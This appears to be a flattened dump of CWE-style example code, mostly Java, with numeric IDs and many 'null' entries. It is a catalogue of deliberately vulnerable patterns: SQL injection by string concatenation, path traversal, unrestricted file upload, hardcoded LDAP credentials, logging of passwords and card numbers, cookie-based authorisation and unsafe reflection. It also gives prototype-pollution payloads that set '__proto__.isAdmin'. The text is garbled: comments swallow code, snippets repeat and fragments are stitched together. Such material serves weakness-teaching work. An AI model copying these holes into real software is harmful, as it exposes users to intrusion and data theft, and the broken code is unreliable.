+} public synchronized void setFirstName(String firstName) {...
+} public String getLastName() {...
+} public synchronized void setLastName(String lastName) {...
+} @OneToOne()public Address getAddress() {...
+} public synchronized void setAddress(Address address) {...
+}   }
+665, private boolean initialized = true;
+public void someMethod() {      if (!initialized) {        // perform initialization tasks ...
+ initialized = true;
+       }   
+665,null
+665,null
+453,null
+453,null
+1279,null
+454, int debugLevel = Integer.getInteger("com.domain.application.debugLevel").intValue();
+
+454,null
+455,null
+770,null
+770,null
+770,null
+770, public void acceptConnections() {      try {       ServerSocket serverSocket = new ServerSocket(SERVER_PORT);
+int counter = 0;
+boolean hasConnections = true;
+while (hasConnections) {         Socket client = serverSocket.accept();
+Thread t = new Thread(new ClientSocketThread(client));
+t.setName(client.getInetAddress().getHostName() + ":" + counter++);
+t.start();
+    }serverSocket.close();
+     } catch (IOException ex) {...
+}   }
+770,null
+1325,null
+789,null
+789, unsigned int size = GetUntrustedInt();
+HashMap list = new HashMap(size);
+
+789,null
+789,null
+789,null
+789,null
+908, private boolean initialized = true;
+public void someMethod() {      if (!initialized) {        // perform initialization tasks ...
+ initialized = true;
+       }   
+908,null
+908,null
+908,null
+457,null
+457,null
+457,null
+909, private boolean initialized = true;
+public void someMethod() {      if (!initialized) {        // perform initialization tasks ...
+ initialized = true;
+       }   
+909,null
+909,null
+909,null
+1271,null
+456,null
+456, private User user;
+public void someMethod() {    // Do something interesting. ...
+  // Throws NPE if user hasn't been properly initialized. String username = user.getName();
+   }
+456,null
+456, public class BankManager {    // user allowed to perform bank manager tasks private User user = null;
+private boolean isUserAuthentic = false;
+  // constructor for BankManager class public BankManager() {       ...
+   }  // retrieve user from database of users public User getUserFromUserDatabase(String username){       ...
+   }  // set user variable using username public void setUser(String username) {       this.user = getUserFromUserDatabase(username);
+   }  // authenticate user public boolean authenticateUser(String username, String password) {       if (username.equals(user.getUsername()) &amp;
+&amp;
+ password.equals(user.getPassword())) {         isUserAuthentic = true;
+    }return isUserAuthentic;
+   }  // methods for performing bank manager tasks ...
+   }
+456,null
+593,null
+605,null
+672,null
+672,null
+672,null
+298,null
+324,null
+613, <web-app>      [...
+snipped...
+] <session-config>       <session-timeout>-1</session-timeout>   </session-config>   </web-app>
+825,null
+825,null
+200,null
+200,null
+200, public BankAccount getUserBankAccount(String username, String accountNumber) {      BankAccount userAccount = null;
+String query = null;
+try {       if (isAuthorizedUser(username)) {         query = "SELECT * FROM accounts WHERE owner = "+ username + " AND accountID = " + accountNumber;
+DatabaseManager dbManager = new DatabaseManager();
+Connection conn = dbManager.getConnection();
+Statement stmt = conn.createStatement();
+ResultSet queryResult = stmt.executeQuery(query);
+userAccount = (BankAccount)queryResult.getObject(accountNumber);
+    }   } catch (SQLException ex) {       String logMessage = "Unable to retrieve account information from database,\nquery: " + query;
+Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);
+   }return userAccount;
+   }
+200, locationClient = new LocationClient(this, this, this);
+locationClient.connect();
+currentUser.setLocation(locationClient.getLastLocation());
+ ...
+  catch (Exception e) {   AlertDialog.Builder builder = new AlertDialog.Builder(this);
+builder.setMessage("Sorry, this application has experienced an error.");
+AlertDialog alert = builder.create();
+alert.show();
+Log.e("ExampleActivity", "Caught exception: " + e + " While on User:" + User.toString());
+ }
+200,null
+200,null
+200,null
+200, locationClient = new LocationClient(this, this, this);
+locationClient.connect();
+Location userCurrLocation;
+userCurrLocation = locationClient.getLastLocation();
+deriveStateFromCoords(userCurrLocation);
+
+1258,null
+203,null
+203,null
+1300,null
+1300,null
+1255,null
+1255,null
+204,null
+1254,null
+209, try {   /...
+/ }catch (Exception e) {   System.out.println(e);
+ }
+209,null
+209,null
+209, public BankAccount getUserBankAccount(String username, String accountNumber) {      BankAccount userAccount = null;
+String query = null;
+try {       if (isAuthorizedUser(username)) {         query = "SELECT * FROM accounts WHERE owner = "+ username + " AND accountID = " + accountNumber;
+DatabaseManager dbManager = new DatabaseManager();
+Connection conn = dbManager.getConnection();
+Statement stmt = conn.createStatement();
+ResultSet queryResult = stmt.executeQuery(query);
+userAccount = (BankAccount)queryResult.getObject(accountNumber);
+    }   } catch (SQLException ex) {       String logMessage = "Unable to retrieve account information from database,\nquery: " + query;
+Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);
+   }return userAccount;
+   }
+210,null
+536, public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {      String username = request.getParameter("username");
+  // May cause unchecked NullPointerException. if (username.length() < 10) {       ...
+   }   }
+537, public class InputFileRead {      private File readFile = null;
+private FileReader reader = null;
+private String inputFilePath = null;
+private final String DEFAULT_FILE_PATH = "c:\\somedirectory\\";
+ public InputFileRead() {       inputFilePath = DEFAULT_FILE_PATH;
+   } public void setInputFile(String inputFile) {        /* Assume appropriate validation / encoding is used and privileges / permissions are preserved */        } public void readInputFile() {            try {           reader = new FileReader(readFile);
+...
+     } catch (RuntimeException rex) {           System.err.println("Error: Cannot open input file in the directory " + inputFilePath);
+System.err.println("Input file has not been set, call setInputFile method before calling readInputFile");
+       } catch (FileNotFoundException ex) {...
+}       }   }
+537, public class BankManagerLoginServlet extends HttpServlet {      protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {            try {            // Get username and password from login page request String username = request.getParameter("username");
+String password = request.getParameter("password");
+ // Authenticate user BankManager bankMgr = new BankManager();
+boolean isAuthentic = bankMgr.authenticateUser(username, password);
+ // If user is authenticated then go to successful login page if (isAuthentic) {               request.setAttribute("login", new String("Login Successful."));
+getServletContext().getRequestDispatcher("/BankManagerServiceLoggedIn.jsp"). forward(request, response);
+       }else {                // Otherwise, raise failed login exception and output unsuccessful login message to error page throw new FailedLoginException("Failed Login for user " + username + " with password " + password);
+               }           } catch (FailedLoginException ex) {            // output failed login message to error page request.setAttribute("error", new String("Login Error"));
+request.setAttribute("message", ex.getMessage());
+getServletContext().getRequestDispatcher("/ErrorPage.jsp").forward(request, response);
+           }       }   
+213,null
+215,null
+359,null
+359,null
+359, locationClient = new LocationClient(this, this, this);
+locationClient.connect();
+Location userCurrLocation;
+userCurrLocation = locationClient.getLastLocation();
+deriveStateFromCoords(userCurrLocation);
+
+497,null
+497,null
+497, try {   ...
+ } catch (Exception e) {   e.printStackTrace();
+ }
+497,null
+497,null
+214, String keystorePass = System.getProperty("javax.net.ssl.keyStorePassword");
+if (keystorePass == null) {   System.err.println("ERROR: Keystore password not specified.");
+System.exit(-1);
+ } ...
+
+532, logger.info("Username: " + usernme + ", CCN: " + ccn);
+
+532, locationClient = new LocationClient(this, this, this);
+locationClient.connect();
+currentUser.setLocation(locationClient.getLastLocation());
+ ...
+  catch (Exception e) {   AlertDialog.Builder builder = new AlertDialog.Builder(this);
+builder.setMessage("Sorry, this application has experienced an error.");
+AlertDialog alert = builder.create();
+alert.show();
+Log.e("ExampleActivity", "Caught exception: " + e + " While on User:" + User.toString());
+ }
+532, public BankAccount getUserBankAccount(String username, String accountNumber) {      BankAccount userAccount = null;
+String query = null;
+try {       if (isAuthorizedUser(username)) {         query = "SELECT * FROM accounts WHERE owner = "+ username + " AND accountID = " + accountNumber;
+DatabaseManager dbManager = new DatabaseManager();
+Connection conn = dbManager.getConnection();
+Statement stmt = conn.createStatement();
+ResultSet queryResult = stmt.executeQuery(query);
+userAccount = (BankAccount)queryResult.getObject(accountNumber);
+    }   } catch (SQLException ex) {       String logMessage = "Unable to retrieve account information from database,\nquery: " + query;
+Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);
+   }return userAccount;
+   }
+541,null
+541,null
+615,null
+22,null
+22, String filename = System.getProperty("com.domain.application.dictionaryFile");
+File dictionaryFile = new File(filename);
+
+22,null
+22, String path = getInputPath();
+if (path.startsWith("/safe_dir/")){   File f = new File(path);
+f.delete() }
+22, public class FileUploadServlet extends HttpServlet {      ...
+ protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {            response.setContentType("text/html");
+PrintWriter out = response.getWriter();
+String contentType = request.getContentType();
+ // the starting position of the boundary headerint ind = contentType.indexOf("boundary=");
+String boundary = contentType.substring(ind+9);
+ String pLine = new String();
+String uploadLocation = new String(UPLOAD_DIRECTORY_STRING);
+ //Constant value // verify that content type is multipart form dataif (contentType != null &amp;
+&amp;
+ contentType.indexOf("multipart/form-data") != -1) {                  // extract the filename from the Http headerBufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));
+...
+pLine = br.readLine();
+String filename = pLine.substring(pLine.lastIndexOf("\\"), pLine.lastIndexOf("\""));
+...
+ // output the file to the local upload directorytry {                        BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));
+for (String line;
+ (line=br.readLine())!=null;
+ ) {                   if (line.indexOf(boundary) == -1) {                     bw.write(line);
+bw.newLine();
+bw.flush();
+          }         } //end of for loopbw.close();
+                 } catch (IOException ex) {...
+}// output successful upload response HTML page           }// output unsuccessful upload response HTML pageelse{...
+}       }       ...
+      }
+23,null
+23,null
+23, public class FileUploadServlet extends HttpServlet {      ...
+ protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {            response.setContentType("text/html");
+PrintWriter out = response.getWriter();
+String contentType = request.getContentType();
+ // the starting position of the boundary headerint ind = contentType.indexOf("boundary=");
+String boundary = contentType.substring(ind+9);
+ String pLine = new String();
+String uploadLocation = new String(UPLOAD_DIRECTORY_STRING);
+ //Constant value // verify that content type is multipart form dataif (contentType != null &amp;
+&amp;
+ contentType.indexOf("multipart/form-data") != -1) {                  // extract the filename from the Http headerBufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));
+...
+pLine = br.readLine();
+String filename = pLine.substring(pLine.lastIndexOf("\\"), pLine.lastIndexOf("\""));
+...
+ // output the file to the local upload directorytry {                        BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));
+for (String line;
+ (line=br.readLine())!=null;
+ ) {                   if (line.indexOf(boundary) == -1) {                     bw.write(line);
+bw.newLine();
+bw.flush();
+          }         } //end of for loopbw.close();
+                 } catch (IOException ex) {...
+}// output successful upload response HTML page           }// output unsuccessful upload response HTML pageelse{...
+}       }       ...
+      }
+36, String filename = System.getProperty("com.domain.application.dictionaryFile");
+File dictionaryFile = new File(filename);
+
+374,null
+374, public class BookStore {      private BookStoreInventory inventory;
+private SalesDBManager sales;
+...
+ // constructor for BookStore public BookStore() {       this.inventory = new BookStoreInventory();
+this.sales = new SalesDBManager();
+...
+   }public void updateSalesAndInventoryForBookSold(String bookISBN) {        // Get book object from inventory using ISBN Book book = inventory.getBookWithISBN(bookISBN);
+ // update sales information for book sold sales.updateSalesInformation(book);
+ // update inventory inventory.updateInventory(book);
+       } // other BookStore methods ...
+   }public class Book {   private String title;
+private String author;
+private String isbn;
+ // Book object constructors and get/set methods ...
+ }
+375, public class ClinicalTrial {   private PatientClass[] patientList = new PatientClass[50];
+public getPatients(...
+){     return patientList;
+  } }
+377,null
+378,null
+378, try {   File temp = File.createTempFile("pattern", ".suffix");
+temp.deleteOnExit();
+BufferedWriter out = new BufferedWriter(new FileWriter(temp));
+out.write("aString");
+out.close();
+ }catch (IOException e) {}
+379,null
+379, try {   File temp = File.createTempFile("pattern", ".suffix");
+temp.deleteOnExit();
+BufferedWriter out = new BufferedWriter(new FileWriter(temp));
+out.write("aString");
+out.close();
+ }catch (IOException e) {}
+427, ...
+System.Runtime.getRuntime().exec("make");
+...
+
+428,null
+488, public class GuestBook extends HttpServlet {      String name;
+ protected void doPost (HttpServletRequest req, HttpServletResponse res) {       name = req.getParameter("name");
+...
+out.println(name + ", thanks for visiting!");
+   }   }
+491, public class BankAccount implements Cloneable{      public Object clone(String accountnumber) throwsCloneNotSupportedException{            Object returnMe = new BankAccount(account number);
+...
+       }   }
+491, protected Object clone() throws CloneNotSupportedException {   ...
+ }
+492, public final class urlTool extends Applet {   private final class urlHelper {     ...
+  }...
+ }
+492, public class OuterClass { // private member variables of OuterClass private String memberOne;
+private String memberTwo;
+  // constructor of OuterClass public OuterClass(String varOne, String varTwo) {     this.memberOne = varOne;
+this.memberTwo = varTwo;
+  }  // InnerClass is a member inner class of OuterClass private class InnerClass {     private String innerMemberOne;
+ public InnerClass(String innerVarOne) {       this.innerMemberOne = innerVarOne;
+   } public String concat(String separator) {   // InnerClass has access to private member variables of OuterClass System.out.println("Value of memberOne is: " + memberOne);
+return OuterClass.this.memberTwo + separator + this.innerMemberOne;
+   }  } }
+492, public class BankAccount {    // private member variables of BankAccount class private String accountOwnerName;
+private String accountOwnerSSN;
+private int accountNumber;
+private double balance;
+  // constructor for BankAccount class public BankAccount(String accountOwnerName, String accountOwnerSSN,int accountNumber, double initialBalance, int initialRate){       this.accountOwnerName = accountOwnerName;
+this.accountOwnerSSN = accountOwnerSSN;
+this.accountNumber = accountNumber;
+this.balance = initialBalance;
+this.start(initialRate);
+   }  // start method will add interest to balance every 30 days   // creates timer object and interest adding action listener object public void start(double rate){       ActionListener adder = new InterestAdder(rate);
+Timer t = new Timer(1000 * 3600 * 24 * 30, adder);
+t.start();
+   }  // InterestAdder is an inner class of BankAccount class   // that implements the ActionListener interface private class InterestAdder implements ActionListener{            private double rate;
+ public InterestAdder(double aRate){           this.rate = aRate;
+     } public void actionPerformed(ActionEvent event){           // update interest double interest = BankAccount.this.balance * rate / 100;
+BankAccount.this.balance += interest;
+           }       }   }
+492,null
+493, public final class WidgetData extends Applet {   public float price;
+...
+public WidgetData(...
+) {     this.price = LookupPrice("MyWidgetType");
+  } }
+493,null
+493, public String configPath = new String("/etc/application/config.dat");
+
+500,null
+500, public class SomeAppClass {   public static String appPropertiesFile = "app/Application.properties";
+...
+   }
+498, public class CloneClient {      public CloneClient() //throwsjava.lang.CloneNotSupportedException {       Teacher t1 = new Teacher("guddu","22,nagar road");
+//...
+// Do some stuff to remove the teacher.Teacher t2 = (Teacher)t1.clone();
+System.out.println(t2.name);
+       }public static void main(String args[]) {       new CloneClient();
+       }   }class Teacher implements Cloneable {   public Object clone() {       try {           return super.clone();
+     }catch (java.lang.CloneNotSupportedException e) {           throw new RuntimeException(e.toString());
+           }       }public String name;
+public String clas;
+public Teacher(String name,String clas) {       this.name = name;
+this.clas = clas;
+       }   }
+499, class PatientRecord {   private String name;
+private String socialSecurityNum;
+public Patient(String name,String ssn) {     this.SetName(name);
+this.SetSocialSecurityNumber(ssn);
+  } }
+522,null
+522, ...
+Properties prop = new Properties();
+prop.load(new FileInputStream("config.properties"));
+String password = prop.getProperty("password");
+DriverManager.getConnection(url, usr, password);
+...
+
+522, ...
+String password = regKey.GetValue(passKey).toString();
+NetworkCredential netCred = new NetworkCredential(username,password,domain);
+...
+
+522,null
+522, int VerifyAdmin(String password) {   if (passwd.Equals(compress(password), compressed_password)) {     return(0);
+  } //Diagnostic Mode return(1);
+ }
+522, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+522,null
+256, ...
+Properties prop = new Properties();
+prop.load(new FileInputStream("config.properties"));
+String password = prop.getProperty("password");
+DriverManager.getConnection(url, usr, password);
+...
+
+256, ...
+String password = regKey.GetValue(passKey).toString();
+NetworkCredential netCred = new NetworkCredential(username,password,domain);
+...
+
+256, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+256,null
+257,null
+257, int VerifyAdmin(String password) {   if (passwd.Equals(compress(password), compressed_password)) {     return(0);
+  } //Diagnostic Mode return(1);
+ }
+257, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+257,null
+260, webapp.ldap.username = secretUsernamewebapp.ldap.password = secretPassword
+260, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+260,null
+13,null
+258, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=...
+
+258,null
+555, webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword
+261, ...
+Properties prop = new Properties();
+prop.load(new FileInputStream("config.properties"));
+String password = Base64.decode(prop.getProperty("password"));
+DriverManager.getConnection(url, usr, password);
+...
+
+261,null
+552,null
+433,null
+433,null
+582, public final class urlTool extends Applet {   public final static URL[] urls;
+...
+ }
+583, public final class urlTool extends Applet {   public void finalize() {     ...
+  }...
+ }
+608, public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {      // variables for registration formpublic String name;
+public String email;
+...
+ public RegistrationForm() {       super();
+   }public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...
+}...
+   }
+642, Cookie[] cookies = request.getCookies();
+for (int i =0;
+ i< cookies.length;
+ i++) {   Cookie c = cookies[i];
+if (c.getName().equals("authenticated") &amp;
+&amp;
+ Boolean.TRUE.equals(c.getValue())) {     authenticated = true;
+  } }
+642, String rName = request.getParameter("reportName");
+File rFile = new File("/usr/local/apfr/reports/" + rName);
+...
+rFile.delete();
+
+642, fis = new FileInputStream(cfg.getProperty("sub")+".txt");
+amt = fis.read(arr);
+out.println(arr);
+
+642,null
+642,null
+426,null
+426,null
+426, ...
+System.Runtime.getRuntime().exec("make");
+...
+
+472, String accountID = request.getParameter("accountID");
+User user = getUserFromID(Long.parseLong(accountID));
+
+472,null
+565, Cookie[] cookies = request.getCookies();
+for (int i =0;
+ i< cookies.length;
+ i++) {   Cookie c = cookies[i];
+if (c.getName().equals("role")) {     userRole = c.getValue();
+  } }
+784, Cookie[] cookies = request.getCookies();
+for (int i =0;
+ i< cookies.length;
+ i++) {   Cookie c = cookies[i];
+if (c.getName().equals("role")) {     userRole = c.getValue();
+  } }
+784,null
+784, Cookie[] cookies = request.getCookies();
+for (int i =0;
+ i< cookies.length;
+ i++) {   Cookie c = cookies[i];
+if (c.getName().equals("authenticated") &amp;
+&amp;
+ Boolean.TRUE.equals(c.getValue())) {     authenticated = true;
+  } }
+73, String rName = request.getParameter("reportName");
+File rFile = new File("/usr/local/apfr/reports/" + rName);
+...
+rFile.delete();
+
+73, fis = new FileInputStream(cfg.getProperty("sub")+".txt");
+amt = fis.read(arr);
+out.println(arr);
+
+114, ...
+System.loadLibrary("library.dll");
+...
+
+114,null
+114,null
+732,null
+732,null
+732,null
+732,null
+1004, String sessionID = generateSessionId();
+Cookie c = new Cookie("session_id", sessionID);
+response.addCookie(c);
+
+767,null
+767, public class Client {   private int UID;
+public int PID;
+private String userName;
+public Client(String userName){     PID = getDefaultProfileID();
+UID = mapUserNametoUID( userName );
+this.userName = userName;
+  }public void setPID(int ID) {     UID = ID;
+  } }
+8,null
+927, Intent intent = new Intent();
+intent.setAction("com.example.CreateUser");
+intent.putExtra("Username", uname_string);
+intent.putExtra("Password", pw_string);
+sendBroadcast(intent);
+
+927, Intent intent = new Intent();
+intent.setAction("com.example.service.UserExists");
+intent.putExtra("Username", uname_string);
+sendStickyBroadcast(intent);
+
+927, Intent intent = new Intent();
+intent.setAction("com.example.OpenURL");
+intent.putExtra("URL_TO_OPEN", url_string);
+sendOrderedBroadcastAsUser(intent);
+
+927, Intent intent = new Intent();
+intent.setAction("com.example.BackupUserData");
+intent.setData(file_uri);
+intent.addFlags(FLAG_GRANT_READ_URI_PERMISSION);
+sendBroadcast(intent);
+
+212,null
+1258,null
+226,null
+226,null
+1342,null
+434,null
+434, public class FileUploadServlet extends HttpServlet {      ...
+ protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {            response.setContentType("text/html");
+PrintWriter out = response.getWriter();
+String contentType = request.getContentType();
+ // the starting position of the boundary headerint ind = contentType.indexOf("boundary=");
+String boundary = contentType.substring(ind+9);
+ String pLine = new String();
+String uploadLocation = new String(UPLOAD_DIRECTORY_STRING);
+ //Constant value // verify that content type is multipart form dataif (contentType != null &amp;
+&amp;
+ contentType.indexOf("multipart/form-data") != -1) {                  // extract the filename from the Http headerBufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));
+...
+pLine = br.readLine();
+String filename = pLine.substring(pLine.lastIndexOf("\\"), pLine.lastIndexOf("\""));
+...
+ // output the file to the local upload directorytry {                        BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));
+for (String line;
+ (line=br.readLine())!=null;
+ ) {                   if (line.indexOf(boundary) == -1) {                     bw.write(line);
+bw.newLine();
+bw.flush();
+          }         } //end of for loopbw.close();
+                 } catch (IOException ex) {...
+}// output successful upload response HTML page           }// output unsuccessful upload response HTML pageelse{...
+}       }       ...
+      }
+494, URL[] classURLs= new URL[]{   new URL("file:subdir/") };
+URLClassLoader loader = new URLClassLoader(classURLs);
+Class loadedClass = Class.forName("loadMe", true, loader);
+
+494,null
+829,null
+830,null
+426,null
+426,null
+426, ...
+System.Runtime.getRuntime().exec("make");
+...
+
+1389,null
+1389,null
+1389,null
+588,null
+681, int i = (int) 33457.8f;
+
+681,null
+681,null
+681,null
+192,null
+192,null
+197,null
+197, ...
+ // update sales database for number of product sold with product ID public void updateSalesForProduct(String productID, int amountSold) {    // get the total number of products in inventory database int productCount = inventory.getProductCount(productID);
+ // convert integer values to short, the method for the   // sales object requires the parameters to be of type short short count = (short) productCount;
+short sold = (short) amountSold;
+ // update sales database for product sales.updateSalesCount(productID, count, sold);
+   }...
+
+178, public String preventXSS(String input, String mask) {   return input.replaceAll("script", mask);
+ }
+22,null
+22, String filename = System.getProperty("com.domain.application.dictionaryFile");
+File dictionaryFile = new File(filename);
+
+22,null
+22, String path = getInputPath();
+if (path.startsWith("/safe_dir/")){   File f = new File(path);
+f.delete() }
+22, public class FileUploadServlet extends HttpServlet {      ...
+ protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {            response.setContentType("text/html");
+PrintWriter out = response.getWriter();
+String contentType = request.getContentType();
+ // the starting position of the boundary headerint ind = contentType.indexOf("boundary=");
+String boundary = contentType.substring(ind+9);
+ String pLine = new String();
+String uploadLocation = new String(UPLOAD_DIRECTORY_STRING);
+ //Constant value // verify that content type is multipart form dataif (contentType != null &amp;
+&amp;
+ contentType.indexOf("multipart/form-data") != -1) {                  // extract the filename from the Http headerBufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));
+...
+pLine = br.readLine();
+String filename = pLine.substring(pLine.lastIndexOf("\\"), pLine.lastIndexOf("\""));
+...
+ // output the file to the local upload directorytry {                        BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));
+for (String line;
+ (line=br.readLine())!=null;
+ ) {                   if (line.indexOf(boundary) == -1) {                     bw.write(line);
+bw.newLine();
+bw.flush();
+          }         } //end of for loopbw.close();
+                 } catch (IOException ex) {...
+}// output successful upload response HTML page           }// output unsuccessful upload response HTML pageelse{...
+}       }       ...
+      }
+23,null
+23,null
+23, public class FileUploadServlet extends HttpServlet {      ...
+ protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {            response.setContentType("text/html");
+PrintWriter out = response.getWriter();
+String contentType = request.getContentType();
+ // the starting position of the boundary headerint ind = contentType.indexOf("boundary=");
+String boundary = contentType.substring(ind+9);
+ String pLine = new String();
+String uploadLocation = new String(UPLOAD_DIRECTORY_STRING);
+ //Constant value // verify that content type is multipart form dataif (contentType != null &amp;
+&amp;
+ contentType.indexOf("multipart/form-data") != -1) {                  // extract the filename from the Http headerBufferedReader br = new BufferedReader(new InputStreamReader(request.getInputStream()));
+...
+pLine = br.readLine();
+String filename = pLine.substring(pLine.lastIndexOf("\\"), pLine.lastIndexOf("\""));
+...
+ // output the file to the local upload directorytry {                        BufferedWriter bw = new BufferedWriter(new FileWriter(uploadLocation+filename, true));
+for (String line;
+ (line=br.readLine())!=null;
+ ) {                   if (line.indexOf(boundary) == -1) {                     bw.write(line);
+bw.newLine();
+bw.flush();
+          }         } //end of for loopbw.close();
+                 } catch (IOException ex) {...
+}// output successful upload response HTML page           }// output unsuccessful upload response HTML pageelse{...
+}       }       ...
+      }
+36, String filename = System.getProperty("com.domain.application.dictionaryFile");
+File dictionaryFile = new File(filename);
+
+470, String ctl = request.getParameter("ctl");
+Class cmdClass = Class.forName(ctl + "Command");
+Worker ao = (Worker) cmdClass.newInstance();
+ao.doAction(request);
+
+470, String ctl = request.getParameter("ctl");
+Class cmdClass = Class.forName(ctl + "Command");
+Worker ao = (Worker) cmdClass.newInstance();
+ao.checkAccessControl(request);
+ao.doAction(request);
+
+502, try {   File file = new File("object.obj");
+ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
+javax.swing.JButton button = (javax.swing.JButton) in.readObject();
+in.close();
+ }
+502,null
+914,null
+1321, function setValueByPath (object, path, value) {   const pathArray = path.split(".");
+ const attributeToSet = pathArray.pop();
+ let objectToModify = object;
+ for (const attr of pathArray) {     if (typeof objectToModify[attr] !== 'object') {       objectToModify[attr] = {};
+ }    objectToModify = objectToModify[attr];
+ }   objectToModify[attributeToSet] = value;
+ return object;
+ } 
+1321, setValueByPath({}, "__proto__.isAdmin", true) setValueByPath({}, "constructor.prototype.isAdmin", true)
+95,null
+95,null
+312, response.addCookie( new Cookie("userAccountID", acctID);
+
+312,null
+312,null
+312, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+312,null
+312,null
+312,null
+312,null
+313, # Java Web App ResourceBundle properties file ...
+webapp.ldap.username=secretUsernamewebapp.ldap.password=secretPassword...
+
+313,null
+315, response.addCookie( new Cookie("userAccountID", acctID);
+
+682,null
+682, ...
+int touchdowns = team.getTouchdowns();
+int yardsGained = team.getTotalYardage();
+System.out.println(team.getName() + " averages " + yardsGained / touchdowns + "yards gained for every touchdown scored");
+...
+
+682,null
+1335,null
+1335,null
+1339,null
+190,null
+190,null
+190,null
+190,null
+191,null
+191,null
+193,null
+193,null
+193,null
+193,null
+369, public int computeAverageResponseTime (int totalTime, int numRequests) {   return totalTime / numRequests;
+ }
+369,null
+369,null
+1265,null
+1265,null
+1281,null
+362,null
+362,null
+828,null
+828,null
+831,null
+831,null
+366,null
+366, public classRace {      static int foo = 0;
+public static void main() {       new Threader().start();
+foo = 1;
+       }public static class Threader extends Thread {       public void run() {           System.out.println(foo);
+     }       }   }
+367,null
+367,null
+367,null
+367,null
+363,null
+431, protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {   String ip = req.getRemoteAddr();
+InetAddress addr = InetAddress.getByName(ip);
+...
+out.println("hello " + addr.getHostName());
+ }
+667, private long someLongValue;
+public long getLongValue() {   return someLongValue;
+ } public void setLongValue(long l) {   someLongValue = l;
+ }
+667,null
+667,null
+667, if (helper == null) {      synchronized (this) {       if (helper == null) {         helper = new Helper();
+    }   }   }return helper;
+
+667,null
+1233,null
+1234,null
+412,null
+413,null
+413, public class BankAccount {    // variable for bank account balance private double accountBalance;
+  // constructor for BankAccount public BankAccount() {       accountBalance = 0;
+   }  // method to deposit amount into BankAccount public void deposit(double depositAmount) {       double newBalance = accountBalance + depositAmount;
+accountBalance = newBalance;
+       }  // method to withdraw amount from BankAccount public void withdraw(double withdrawAmount) {       double newBalance = accountBalance - withdrawAmount;
+accountBalance = newBalance;
+       }  // other methods for accessing the BankAccount object ...
+   }
+609, if (helper == null) {      synchronized (this) {       if (helper == null) {         helper = new Helper();
+    }   }   }return helper;
+
+609,null
+820,null
+543, private static NumberConverter singleton;
+public static NumberConverter get_singleton() {   if (singleton == null) {     singleton = new NumberConverter();
+  }return singleton;
+ }
+567, public static class Counter extends HttpServlet {   static int count = 0;
+protected void doGet(HttpServletRequest in, HttpServletResponse out)throws ServletException, IOException {     out.setContentType("text/plain");
+PrintWriter p = out.getWriter();
+count++;
+p.println(count + " hits so far!");
+  } }
+1264,null
+572, Thread thr = new Thread() {   public void run() {     ...
+  } };
+ thr.run();
+
+574, @Entitypublic class Customer implements Serializable {      private String id;
+private String firstName;
+private String lastName;
+private Address address;
+ public Customer() {...
+} public Customer(String id, String firstName, String lastName) {...
+} @Idpublic String getCustomerId() {...
+} public synchronized void setCustomerId(String id) {...
+} public String getFirstName() {...
+} public synchronized void setFirstName(String firstName) {...
+} public String getLastName() {...
+} public synchronized void setLastName(String lastName) {...
+} @OneToOne()public Address getAddress() {...
+} public synchronized void setAddress(Address address) {...
+}   }
+480,null
+480,null
+480,null
+481,null
+481,null
+481,null
+481, public void checkValid(boolean isValid) {   if (isValid = true) {     System.out.println("Performing processing");
+doSomethingImportant();
+  }else {     System.out.println("Not Valid, do not perform processing");
+return;
+  } }
+481,null
+597, String str1 = new String("Hello");
+String str2 = new String("Hello");
+if (str1 == str2) {   System.out.println("str1 == str2");
+ }
+597,<p id="ieq3s1" type="text">(i === s1) is FALSE</p> <p id="s4eq3i" type="text">(s4 === i) is FALSE</p> <p id="s4eq3s1" type="text">(s4 === s1) is FALSE</p>  var i = 65;
+ var s1 = '65';
+ var s4 = new String('65');
+  if (i === s1) { document.getElementById("ieq3s1").innerHTML = "(i === s1) is TRUE";
+ }  if (s4 === i) { document.getElementById("s4eq3i").innerHTML = "(s4 === i) is TRUE";
+ }  if (s4 === s1) { document.getElementById("s4eq3s1").innerHTML = "(s4 === s1) is TRUE";
+ }
+597,null
+484, public void printMessage(int month){      switch (month) {       case 1: print("January");
+case 2: print("February");
+case 3: print("March");
+case 4: print("April");
+case 5: print("May");
+case 6: print("June");
+case 7: print("July");
+case 8: print("August");
+case 9: print("September");
+case 10: print("October");
+case 11: print("November");
+case 12: print("December");
+       }println(" is a great month");
+   }
+484,null
+617, String email = request.getParameter("email_address");
+assert email != null;
+
+698,null
+783,null
+783, public double calculateReturnOnInvestment(double currentValue, double initialInvestment) {   double returnROI = 0.0;
+  // calculate return on investment returnROI = currentValue - initialInvestment / initialInvestment;
+ return returnROI;
+   }
+1280,null
